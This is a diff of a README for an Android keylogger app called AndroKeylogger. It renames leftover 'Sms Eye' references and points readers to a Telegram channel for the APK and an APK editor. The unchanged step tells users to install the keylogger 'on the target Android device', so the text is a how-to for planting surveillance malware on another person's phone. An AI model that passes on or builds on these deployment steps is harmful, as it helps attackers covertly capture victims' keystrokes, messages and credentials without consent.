@@ -24,9 +24,9 @@ AndroKeylogger is a powerful Android keylogger application designed to provide a
 
 
 ## Usage
-1. Download Sms Eye APK Download Sms Eye APK file, you can download file from this repository or download it from our [Telegram channel](https://t.me/AbyssalArmy).
+1. Download AndroKeylogger APK file, you can download file from this repository or download it from our [Telegram channel](https://t.me/AbyssalArmy).
 
-2. Downlaod Apk Editor Download the APK Editor to customize the Sms Eye application, you can download Apk Editor from our [Telegram channel](https://t.me/AbyssalArmy).
+2. Download the APK Editor PRO to customize the AndroKeylogger application, you can download Apk Editor from our [Telegram channel](https://t.me/AbyssalArmy).
 
 3. Download and Install: Download the AndroKeylogger APK file and install it on the target Android device.
 
